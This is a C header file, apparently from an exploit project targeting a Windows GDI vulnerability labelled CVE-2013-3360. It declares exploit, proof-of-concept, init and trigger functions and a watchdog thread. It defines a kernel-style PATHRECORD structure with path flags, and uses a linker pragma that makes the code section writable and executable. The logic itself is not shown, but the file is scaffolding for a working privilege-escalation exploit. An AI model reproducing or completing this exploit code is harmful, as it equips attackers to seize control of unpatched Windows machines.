#pragma once
#include "base.h"

#pragma comment(lib, "gdi32")
#pragma comment(lib, "kernel32")
#pragma comment(lib, "user32")
#pragma comment(linker, "/SECTION:.text,ERW")

#define MAX_POLYPOINTS (8192 * 3)
#define MAX_REGIONS 8192
#define CYCLE_TIMEOUT 10000

#define PD_BEGINSUBPATH   0x00000001
#define PD_ENDSUBPATH     0x00000002
#define PD_RESETSTYLE     0x00000004
#define PD_CLOSEFIGURE    0x00000008
#define PD_BEZIERS        0x00000010

typedef struct _PATHRECORD
{
	struct _PATHRECORD *next;
	struct _PATHRECORD *prev;
	ULONG flags;
	ULONG count;
	POINT points[4];
}PATHRECORD, *PPATHRECORD;

BOOL Exploit_CVE_2013_3360();
BOOL POC_CVE_2013_3360();
DWORD WINAPI WathdogThread(LPVOID param);
BOOL Init_CVE_2013_3360();
BOOL Trigger_CVE_2013_3360();